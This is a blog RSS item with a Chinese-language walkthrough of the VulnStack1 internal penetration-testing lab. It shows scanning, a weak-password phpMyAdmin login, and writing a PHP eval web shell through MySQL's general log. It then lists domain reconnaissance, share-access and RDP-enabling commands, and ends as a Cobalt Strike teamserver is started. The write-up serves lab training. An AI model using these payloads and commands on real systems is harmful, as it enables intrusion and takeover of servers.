<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>internal_pentest on Under The Ginkgo</title>
        <link>https://ginkgo.org.cn/tags/internal_pentest/</link>
        <description>Recent content in internal_pentest on Under The Ginkgo</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-uk</language>
        <lastBuildDate>Tue, 11 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://ginkgo.org.cn/tags/internal_pentest/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Internal Pentest VulnStack1 内网渗透练习</title>
        <link>https://ginkgo.org.cn/posts/internal_pentest_vulnstack1/</link>
        <pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ginkgo.org.cn/posts/internal_pentest_vulnstack1/</guid>
        <description>&lt;h2 id=&#34;internal-pentest-vulnstack1-内网渗透练习&#34;&gt;Internal Pentest VulnStack1 内网渗透练习&lt;/h2&gt;
&lt;h3 id=&#34;靶场搭建&#34;&gt;靶场搭建&lt;/h3&gt;
&lt;p&gt;搭建环境: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统：MacosX &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;虚拟机：VMware Fusion &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;靶场信息：&lt;a class=&#34;link&#34; href=&#34;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;找了一圈教程都是在Windows上搭建的，不过只要了解原理，其实放到mac甚至是其他环境下也是一样的。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;红日的靶场非常友好了，我们只需要将靶机从百度云下载下来解压缩，看到很多的文件不要慌，直接用vmware fusion打开vmx文件就可以开启靶机。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来我们就分别导入三个虚拟机，并且进行少量的配置 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Windows 7 x64 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将默认的网卡选择为Host Only，在vmware fusion里叫做&amp;quot;Private to my Mac&amp;quot;，即独立于mac主机本身的一个虚拟网络中； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;增加一张网卡，选择为桥接，这里叫Autodetect，就是和mac在同一个内网网段中，相当于一台虚拟主机连入（存在风险，慎用，可以考虑选择另一个Host-Only的虚拟网段）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;开启虚拟机，输入密码（所有虚拟机统一为hongrisec@2019，之后不再重复）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;搜索phpstudy，开启服务（如果需要用局域网访问需要在防火墙进行修改，慎用） &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;配置至此完成。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows Server 2003 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开启即可，无需做任何调整，默认静态IP为192.168.52.141。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows Server 2008 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开启之后修改密码即可，需要复杂密码，记得要记录下来不要遗忘，默认静态IP为192.168.52.138，无需其他修改。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/vulnStack1.png&#34;
         alt=&#34;Figure 1: 内网渗透网络拓扑&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;内网渗透网络拓扑&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;至此配置就结束了，别害怕，前辈们为了让工具好用做了很多努力，我们只需要站在巨人的肩膀上继续学习就可以了。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;前瞻知识&#34;&gt;前瞻知识&lt;/h3&gt;
&lt;p&gt;如果是第一次接触这种和Windows域有关的渗透练习的话，建议还是先了解一下域的相关知识，这不仅会帮助理解复现的过程，同样重要的是这也会帮助大家解决在复现过程中出现的各种问题（靶场的设计也并不是面面俱到的，不同的环境下运行也会碰到很多未知的问题） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://coffeemilk.blog.csdn.net/article/details/121282617?spm=1001.2014.3001.5506&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows中的工作组(Work Group)、域(Domain)、域控(DC)、活动目录(AD)介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_45677145/article/details/109604157?spm=1001.2014.3001.5506&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AD域的详细介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;外网渗透&#34;&gt;外网渗透&lt;/h3&gt;
&lt;h4 id=&#34;信息收集&#34;&gt;信息收集&lt;/h4&gt;
&lt;p&gt;老规矩先用nmap进行扫描 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sS 192.168.0.104/24
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_16-13-08_screenshot.png&#34;
         alt=&#34;Figure 2: nmap 端口扫描&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;nmap 端口扫描&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;发现80端口监听http服务，直接打开网页看一下：&lt;a class=&#34;link&#34; href=&#34;http://192.168.0.100&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://192.168.0.100&lt;/a&gt; : &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-02-25_screenshot.png&#34;
         alt=&#34;Figure 3: phpStudy探针1&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;phpStudy探针1&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_17-00-47_screenshot.png&#34;
         alt=&#34;Figure 4: phpStudy 探针2&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;phpStudy 探针2&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;从php探针中我们可以获取大量主机的信息，这里还用弱口令测试了数据库的连接，我们先放着，可能后续有用。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来用dirmap来扫一下目录： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dirmap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.0.100&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lcf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-05-26_screenshot.png&#34;
         alt=&#34;Figure 5: dirmap 目录爆破&#34; width=&#34;500px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;dirmap 目录爆破&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;根据扫描的结果，我们访问/phpmyadmin界面，来对mysql数据库进行一些操作: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这里我们先尝试一些弱口令，实在不行再用BrupSuite爆破，例如：root, admin, 123456，发现这里直接用root:root就进去了。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;getshell&#34;&gt;getshell&lt;/h4&gt;
&lt;p&gt;那么下一步就是要想办法getshell，看到mysql自然想到可以利用 &lt;code&gt;SELECT INTO DUMPFILE/OUTFILE&lt;/code&gt; 来写入一句话木马来获取shell。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;但我们知道要使用这个语法需要满足三个条件： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;secure_file_priv&lt;/code&gt; 变量为空，或者为我们所知道的路径中，表示支持数据的导入导出； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;目标目录的权限可写，mysql用户也有写入的权限； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;需要目标目录的绝对路径。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么我们先查看 &lt;code&gt;secure-file-priv&lt;/code&gt; 的值，发现为NULL，此路不通： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_17-16-27_screenshot.png&#34;
         alt=&#34;Figure 6: 查询secure-file-priv的值&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 6: &lt;!-- raw HTML omitted --&gt;查询secure-file-priv的值&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们知道还有一种写入的方法就是日志法 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SHOW&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VARIABLES&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LIKE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%general%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;查看日志文件相关配置&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_17-26-30_screenshot.png&#34;
         alt=&#34;Figure 7: 查看general_log的值&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 7: &lt;!-- raw HTML omitted --&gt;查看general_log的值&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来我们开启general log，并且通过之前php探针所得到的绝对路径设置log文件的地址，最后写入一句话木马： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GLOBAL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;general_log&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;开启&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;general&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log模式&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GLOBAL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;general_log_file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:/phpStudy/WWW/1.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;设置日志目录为我们想要执行的&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell地址&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[cmd]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;直接写入&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell就会被记录到日志文件中去&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;蚁剑连接成功 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-08-22_screenshot.png&#34;
         alt=&#34;Figure 8: 蚁剑连接&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 8: &lt;!-- raw HTML omitted --&gt;蚁剑连接&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;其实到这里就已经可以通过蚁剑来getshell了，但我们也可以进去再看看。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;进入之后发现有cms， &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-20-31_screenshot.png&#34;
         alt=&#34;Figure 9: 发现cms&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 9: &lt;!-- raw HTML omitted --&gt;发现cms&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;尝试访问后根据公告信息进入后台， &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-22-00_screenshot.png&#34;
         alt=&#34;Figure 10: 进入cms&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 10: &lt;!-- raw HTML omitted --&gt;进入cms&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;通过修改或者增加模版文件也可以用来getshell &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-30-41_screenshot.png&#34;
         alt=&#34;Figure 11: 模版文件&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 11: &lt;!-- raw HTML omitted --&gt;模版文件&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;内网渗透&#34;&gt;内网渗透&lt;/h3&gt;
&lt;h4 id=&#34;信息收集&#34;&gt;信息收集&lt;/h4&gt;
&lt;p&gt;建议一些基础的信息可以直接在get的shell中执行来获取，因为CS的beacon一个是不稳定而且返回速度也慢： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig /all   查看本机ip，所在域
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;route print     打印路由信息
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view        查看局域网内其他主机名
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp -a          查看arp缓存
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net start       查看开启了哪些服务
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share       查看开启了哪些共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share ipc$  开启ipc共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share c$    开启c盘共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;192.168.xx.xx&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;pc$ &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; /user:&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;   与192.168.xx.xx建立空连接
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;192.168.xx.xx&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;$ &lt;span class=&#34;s2&#34;&gt;&amp;#34;密码&amp;#34;&lt;/span&gt; /user:&lt;span class=&#34;s2&#34;&gt;&amp;#34;用户名&amp;#34;&lt;/span&gt;  建立c盘共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dir &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;192.168.xx.xx&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;$&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser    查看192.168.xx.xx c盘user目录下的文件
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;​
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user                 查看本机用户列表
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user /domain         查看域用户
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net localgroup administrators   查看本地管理员组（通常会有域用户）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view /domain         查看有几个域
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user 用户名 /domain   获取指定域用户的信息
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group 组名 /domain    查看域中某工作组
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &lt;span class=&#34;s2&#34;&gt;&amp;#34;domain admins&amp;#34;&lt;/span&gt; /domain  查看域管理员的名字
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &lt;span class=&#34;s2&#34;&gt;&amp;#34;domain computers&amp;#34;&lt;/span&gt; /domain  查看域中的其他主机名
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &lt;span class=&#34;s2&#34;&gt;&amp;#34;doamin controllers&amp;#34;&lt;/span&gt; /domain  查看域控制器（可能有多台）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; find &lt;span class=&#34;s2&#34;&gt;&amp;#34;3389&amp;#34;&lt;/span&gt;   查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;REG ADD HKLM&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentControlSet&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;ontrol&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;erminal&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;Server /v fDenyTSConnections /t REG_DWORD /d &lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt; /f  用于开启远程桌面登录
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;横向移动&#34;&gt;横向移动&lt;/h4&gt;
&lt;p&gt;启动CS服务端： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ./teamserver 192.168.0.106 password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打开客户端CS连接： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java -XX:+UseParallelGC -XX:+AggressiveHeap -XX:ParallelGCThreads&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; -jar cobaltstrike.jar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-50-18_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-57-37_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-58-04_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-59-14_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
